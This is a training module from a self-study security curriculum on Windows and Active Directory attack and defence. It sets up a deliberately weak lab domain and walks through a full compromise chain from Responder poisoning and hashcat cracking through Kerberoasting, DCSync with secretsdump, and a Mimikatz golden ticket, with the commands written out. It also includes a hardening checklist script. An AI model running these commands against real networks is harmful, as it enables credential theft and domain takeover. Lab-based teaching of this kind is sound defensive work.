# Phase 3 — Track D: Windows & Active Directory Security

> **Most enterprise environments run on Windows/AD. This is the dominant attack surface in corporate security.**  
> **Prerequisites:** [PHASE-2-CORE-ATTACK-DEFENSE.md](PHASE-2-CORE-ATTACK-DEFENSE.md) complete  
> **Schedule:** Every Thursday + deep work Saturdays  
> **Duration:** ~7 months (parallel with other tracks)

---

## Table of Contents

- [D.1 Windows Security Fundamentals](#d1-windows-security-fundamentals)
- [D.2 Active Directory Concepts](#d2-active-directory-concepts)
- [D.3 Active Directory Attack Classes](#d3-active-directory-attack-classes)
- [D.4 Advanced Concepts](#d4-advanced-concepts)
- [D.5 Tools](#d5-tools)
- [D.6 Lab Setup for AD Track](#d6-lab-setup-for-ad-track)
- [D.7 Mini Projects](#d7-mini-projects)
- [Track D Capstone](#track-d-capstone--full-ad-compromise-chain)

---

## D.1 Windows Security Fundamentals

### Windows Architecture

```
┌──────────────────────────────────────┐
│           USER MODE                   │
│  ┌─────────┐ ┌─────────┐ ┌────────┐ │
│  │  Apps   │ │ Subsystem│ │  DLLs  │ │
│  │         │ │(Win32,  │ │        │ │
│  │         │ │ POSIX)  │ │        │ │
│  └────┬────┘ └────┬────┘ └───┬────┘ │
├───────┼───────────┼──────────┼──────┤
│       │     KERNEL MODE       │       │
│  ┌────┴───────────────────────┴────┐ │
│  │     Executive Services           │ │
│  │  (I/O, Memory, Process, Security)│ │
│  ├──────────────────────────────────┤ │
│  │          Kernel / HAL            │ │
│  └──────────────────────────────────┘ │
└──────────────────────────────────────┘
```

### Key Concepts

| Concept | Security Relevance |
|---|---|
| **NTFS permissions** | ACLs on files/folders — more granular than Linux |
| **Windows Registry** | Central config store — attack surface for persistence |
| **Windows Services** | Run as SYSTEM — misconfiguration = privesc |
| **NTLM** | Challenge-response, vulnerable to relay |
| **Kerberos** | Ticket-based, Golden/Silver ticket attacks |
| **SAM database** | Local password hashes (locked when OS running) |
| **LSASS process** | Holds credentials in memory — Mimikatz target |

### Windows Privilege Escalation Paths

| Path | How It Works | Detection |
|---|---|---|
| **Unquoted service paths** | `C:\Program Files\MyApp\app.exe` → drop `C:\Program.exe` | `wmic service get name,pathname` |
| **Weak service permissions** | Modify service binary or config | `accesschk.exe` |
| **AlwaysInstallElevated** | MSI runs as SYSTEM | Registry check |
| **Token impersonation** | `SeImpersonatePrivilege` → JuicyPotato/PrintSpoofer | `whoami /priv` |
| **DLL hijacking** | Place malicious DLL in app's search path | ProcMon |
| **Scheduled task abuse** | Modify existing task or create new | `schtasks /query` |
| **Stored credentials** | `cmdkey /list`, browser creds, registry | Manual inspection |
| **Weak registry permissions** | Modify service registry keys | `regini` |

### Tools

```
winpeas (Windows privilege escalation enumeration),
PowerSploit (PowerShell attack framework),
Seatbelt (system enumeration),
SharpUp (privesc checker),
PowerShell Empire (concepts — defensive awareness)
```

---

## D.2 Active Directory Concepts

### Core AD Architecture

```
Forest: corp.local
├── Domain: us.corp.local
│   ├── Domain Controller (DC01)
│   ├── OU: Finance
│   │   ├── Users
│   │   └── Workstations
│   ├── OU: IT
│   │   ├── Admins
│   │   └── Servers
│   └── Group Policy Objects (GPOs)
│
└── Domain: eu.corp.local
    ├── Domain Controller (DC02)
    └── Trust relationship with us.corp.local
```

### Core Concepts

| Concept | What It Is |
|---|---|
| **Domain** | Security boundary — users, computers, policies |
| **Forest** | Collection of domains with shared schema |
| **Trust** | Authentication path between domains/forests |
| **Domain Controller** | Holds AD database, processes auth requests |
| **Group Policy (GPO)** | Centralized configuration management |
| **Organizational Unit (OU)** | Container for organizing objects |
| **Security Identifier (SID)** | Unique identifier for every AD object |
| **ACLs in AD** | Access control on directory objects (not just files) |

### Authentication Protocols

#### NTLM
```
Client                        Server
  | ── NTLM_NEGOTIATE ───────> |
  | <─ NTLM_CHALLENGE ──────── |
  | ── NTLM_AUTHENTICATE ────> |
  |                            | (verifies against DC)
  
Vulnerability: No mutual authentication → relay attacks
```

#### Kerberos
```
Client                          KDC                          Server
  | ── AS-REQ (username) ────> |                             |
  | <─ AS-REP (TGT) ────────── |                             |
  | ── TGS-REQ (TGT + SPN) ──> |                             |
  | <─ TGS-REP (Service Ticket)│                             |
  | ── AP-REQ (Service Ticket) ─────────────────────────────> |
  
TGT = Ticket Granting Ticket (encrypted with krbtgt hash)
Service Ticket = encrypted with service account hash
```

| Component | Description | Attack Target |
|---|---|---|
| **AS-REQ** | Initial auth request | AS-REP Roasting |
| **TGT** | Proof of authentication | Golden Ticket |
| **TGS** | Request for service access | Kerberoasting |
| **Service Ticket** | Access to specific service | Silver Ticket |
| **krbtgt hash** | Master key for the domain | Golden Ticket, DCSync |

---

## D.3 Active Directory Attack Classes

| Attack | What It Exploits | Tool |
|---|---|---|
| **Kerberoasting** | Service account SPNs — crack ticket offline | Impacket `GetUserSPNs`, Rubeus |
| **AS-REP Roasting** | Accounts with "Do not require pre-auth" | Impacket `GetNPUsers`, Rubeus |
| **Pass-the-Hash** | NTLM hash reuse without plaintext | CrackMapExec, Impacket `psexec` |
| **Pass-the-Ticket** | Kerberos ticket reuse | Mimikatz, Rubeus |
| **Golden Ticket** | Forge TGT with krbtgt hash | Mimikatz `kerberos::golden` |
| **Silver Ticket** | Forge service ticket for specific service | Mimikatz |
| **DCSync** | Replicate domain creds as if a DC | Impacket `secretsdump` |
| **LLMNR/NBT-NS Poisoning** | Capture credentials via poisoned name resolution | Responder |
| **NTLM Relay** | Relay captured auth to another service | `ntlmrelayx` |
| **BloodHound Analysis** | Map attack paths through AD ACLs | BloodHound + Neo4j |
| **GPO Abuse** | Modify group policy for code execution | PowerSploit |
| **ACL Abuse** | Misconfigured AD permissions | BloodHound, PowerView |

### Attack Chain Example

```
[No credentials] ── LLMNR poisoning ──> [NTLM hash]
      │
      v
[Crack hash] ──> [Plaintext password]
      │
      v
[AD enumeration] ── BloodHound ──> [Attack path map]
      │
      v
[Kerberoastable account] ──> [Service ticket]
      │
      v
[Crack ticket] ──> [Service account password]
      │
      v
[ACL misconfiguration] ──> [Domain Admin]
      │
      v
[DCSync] ──> [All domain credentials]
      │
      v
[Golden Ticket] ──> [Persistence forever]
```

---

## D.4 Advanced Concepts

- **Domain enumeration methodology:** systematic information gathering
- **Attack path chaining:** user → service account → Domain Admin
- **Persistence techniques:** Golden Ticket, skeleton key, DSRM admin
- **Forest trust attacks:** cross-domain privilege escalation
- **Azure AD attack surface:** cloud-connected AD extension

---

## D.5 Tools

| Tool | Purpose | Local Setup |
|---|---|---|
| **Impacket** | Windows protocol attacks (Python) | Pre-installed on Kali |
| **BloodHound + Neo4j** | AD attack path visualization | Docker |
| **SharpHound** | AD data collector (C#) | Run on Windows |
| **CrackMapExec** | Network auth testing, lateral movement | pip install |
| **Responder** | LLMNR/NBT-NS poisoning | Pre-installed on Kali |
| **ntlmrelayx** | NTLM relay attacks | Part of Impacket |
| **Mimikatz** | Credential extraction from memory | Windows only |
| **Rubeus** | Kerberos abuse (C#) | Windows |
| **PowerView** | AD reconnaissance (PowerShell) | PowerShell |
| **evil-winrm** | WinRM shell access | gem install |
| **enum4linux-ng** | SMB/RPC enumeration | Pre-installed |

---

## D.6 Lab Setup for AD Track

### Configure Your Domain Controller

```powershell
# On Windows Server 2019 (192.168.56.10)
# After Phase 0 setup, configure AD:

# Install AD DS
Install-WindowsFeature -Name AD-Domain-Services -IncludeManagementTools

# Promote to Domain Controller
Import-Module ADDSDeployment
Install-ADDSForest -DomainName "lab.local" -InstallDns

# Create users
New-ADUser -Name "john.finance" -AccountPassword (ConvertTo-SecureString "Password123!" -AsPlainText -Force) -Enabled $true
New-ADUser -Name "sarah.it" -AccountPassword (ConvertTo-SecureString "Summer2024!" -AsPlainText -Force) -Enabled $true

# Create service accounts with SPNs (for Kerberoasting)
New-ADUser -Name "svc_sql" -ServicePrincipalNames @("MSSQLSvc/dc01.lab.local:1433") -AccountPassword (ConvertTo-SecureString "SvcPass123!" -AsPlainText -Force) -Enabled $true

# Configure misconfigurations:
# - Set "Do not require pre-auth" on one account (AS-REP Roasting)
# - Add user to "Domain Admins" incorrectly (lateral movement)
# - Create weak ACLs (BloodHound paths)
# - Enable LLMNR/NBT-NS (default — leave enabled)
# - Disable SMB signing on some hosts (relay target)
```

### Verify Setup from Kali

```bash
# Test connectivity
ping 192.168.56.10

# Enumerate SMB
enum4linux-ng 192.168.56.10
smbclient -L //192.168.56.10 -N

# Test Responder (run and wait for broadcast)
sudo responder -I eth1 -wrfv

# BloodHound collection
python3 /usr/share/bloodhound-python/bloodhound.py -d lab.local -u john.finance -p 'Password123!' -c all -ns 192.168.56.10
```

---

## D.7 Mini Projects

### D.7.1 — AD Attack Chain Documentation

**Starting position:** Kali with no credentials on your lab network.

**Full chain to document:**

```
Step 1: Responder captures NTLM hash from broadcast
  → Command: sudo responder -I eth1 -wrfv
  
Step 2: Crack the hash with hashcat
  → hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
  
Step 3: Enumerate AD with credentials
  → crackmapexec smb 192.168.56.0/24 -u john.finance -p 'Password123!'
  → enum4linux-ng -u john.finance -p 'Password123!' 192.168.56.10
  
Step 4: BloodHound collection and analysis
  → bloodhound-python -d lab.local -u john.finance -p 'Password123!' -c all
  → Upload to BloodHound GUI → Find shortest paths
  
Step 5: Kerberoasting
  → impacket-GetUserSPNs lab.local/john.finance:'Password123!' -dc-ip 192.168.56.10 -request
  → Crack with hashcat -m 13100
  
Step 6: ACL abuse path to Domain Admin
  → Use BloodHound identified path
  → PowerView or native commands
  
Step 7: DCSync
  → impacket-secretsdump lab.local/admin:'AdminPass123!'@192.168.56.10
  
Step 8: Golden Ticket
  → Mimikatz: kerberos::golden /user:Administrator /domain:lab.local /sid:S-1-5-21-... /krbtgt:... /ptt
```

**Document every step with:** command, output, screenshot, explanation.

### D.7.2 — BloodHound Attack Path Analyzer

```python
# bh_analyzer.py
# Queries BloodHound Neo4j database via API

# Features:
# 1. Connect to Neo4j (bolt://localhost:7687)
# 2. Extract all shortest paths to Domain Admin
# 3. Rank paths by:
#    - Number of hops (fewer = easier)
#    - Exploitability (known tools available)
#    - Credential requirements at each step
# 4. Output: prioritized attack path report

# Neo4j query patterns:
# MATCH p=shortestPath((n)-[:MemberOf|AdminTo|HasSession|CanRDP|CanPSRemote|ExecuteDCOM|AllowedToDelegate*1..]->(m {name:'ADMIN@LAB.LOCAL'}))
# RETURN p

# For each edge type, include remediation:
# - AdminTo → Remove admin rights
# - MemberOf → Review group membership
# - CanRDP → Restrict RDP access
# - etc.
```

### D.7.3 — AD Hardening Checklist Validator

```powershell
# ad_hardening.ps1
# Run on the Domain Controller

# Checks to implement:
# 1. Accounts with no Kerberos pre-auth
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth

# 2. Accounts with "password never expires"
Get-ADUser -Filter {PasswordNeverExpires -eq $true}

# 3. Service accounts in privileged groups
Get-ADGroupMember "Domain Admins" | Where-Object {$_.objectClass -eq "user" -and $_.ServicePrincipalName}

# 4. AdminSDHolder misconfigurations
# (complex — check ACLs on AdminSDHolder container)

# 5. Dangerous ACEs on sensitive objects
# (Get-ACL on critical OUs and groups)

# 6. LLMNR/NBNS enabled
Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient" -Name EnableMulticast

# 7. SMB signing disabled
Get-SmbServerConfiguration | Select-Object RequireSecuritySignature, EnableSecuritySignature

# Output: hardening report with PASS/FAIL for each check + remediation
```

---

## Track D Capstone — Full AD Compromise Chain

### What It Is
A complete Active Directory penetration test on your lab environment, from zero credentials to Domain Admin, documented as a professional engagement report.

### Required Attack Chain

```
1. NETWORK ACCESS
   └── Kali on host-only network with target VMs

2. CREDENTIAL CAPTURE
   └── LLMNR/NBT-NS poisoning with Responder
   └── NTLMv2 hash captured

3. HASH CRACKING
   └── hashcat -m 5600 against rockyou.txt

4. AD ENUMERATION
   └── CrackMapExec for network discovery
   └── BloodHound for attack path mapping
   └── enum4linux-ng for SMB/RPC data

5. KERBEROASTING
   └── GetUserSPNs to request service tickets
   └── hashcat -m 13100 to crack service account

6. LATERAL MOVEMENT
   └── Pass-the-Hash or cracked credentials
   └── evil-winrm or psexec for access

7. PRIVILEGE ESCALATION
   └── BloodHound-identified ACL abuse path
   └── Add self to Domain Admins or equivalent

8. DCSYNC
   └── secretsdump to extract all credentials

9. GOLDEN TICKET PERSISTENCE
   └── Forge TGT with krbtgt NTLM hash
   └── Pass-the-Ticket for persistent access
```

### Deliverable

Penetration test report covering:
1. **Executive Summary** — risk to the organization
2. **Methodology** — tools and techniques used
3. **Attack Narrative** — chronological with screenshots
4. **Findings Table** — each vulnerability with severity
5. **Remediation** — per-finding hardening recommendations
6. **Appendix** — full command logs and tool output

**Publish on GitHub.**

---

*v2 — Local-first · Free · No KYC · No Subscriptions*
